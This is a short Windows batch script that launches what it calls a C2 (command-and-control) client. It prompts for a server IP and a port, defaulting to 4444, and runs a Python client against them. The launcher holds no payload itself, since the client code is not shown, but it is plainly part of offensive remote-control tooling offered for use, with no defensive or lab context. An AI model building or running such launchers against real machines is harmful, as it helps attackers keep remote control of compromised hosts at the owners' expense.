@echo off
title C2 Client Launcher
color 0A

echo ==============================
echo     🐍 C2 Client Launcher
echo ==============================
echo.

set /p SERVER_IP=Enter Server IP (e.g., 192.168.1.100): 
set /p PORT=Enter Server Port (default is 4444): 

if "%PORT%"=="" set PORT=4444

echo.
echo [*] Connecting to %SERVER_IP%:%PORT% ...
echo.

python client.py %SERVER_IP% %PORT%

echo.
echo [*] Client has exited. Press any key to close this window...
pause >nul
